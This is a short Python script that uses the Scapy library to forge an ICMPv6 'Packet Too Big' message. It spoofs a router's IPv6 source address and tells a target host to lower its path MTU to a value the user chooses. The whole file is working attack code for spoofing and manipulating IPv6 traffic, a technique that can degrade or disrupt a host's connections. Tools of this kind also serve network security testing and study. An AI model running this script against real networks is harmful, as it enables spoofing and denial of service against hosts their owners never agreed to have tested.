#!/usr/bin/python
import sys
from scapy.layers.inet6 import IPv6, ICMPv6PacketTooBig, IPerror6, ICMPv6EchoRequest
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.volatile import RandString

# Ask user to insert value
if len(sys.argv) == 5:
    src_router = sys.argv[1]
    src_host = sys.argv[2]
    dst_host = sys.argv[3]
    mtu = int(sys.argv[4])
else:
    print("Please insert:\n 1. Router's IPv6 address\n 2. Source IPv6 address of host"
          "\n 3. Destination IPv6 address\n 4. MTU")
    sys.exit(1)

# Generate packet
data = Raw(RandString(size=mtu-96))
layer3 = IPv6(src=src_router, dst=src_host)
packetTooBig = ICMPv6PacketTooBig(mtu=mtu)/IPerror6(src=src_host, dst=dst_host)/\
               ICMPv6EchoRequest()/data
packet1 = layer3/packetTooBig
send(packet1, verbose=False)
print("Sending Packet Too Big message to the host: " + src_host)

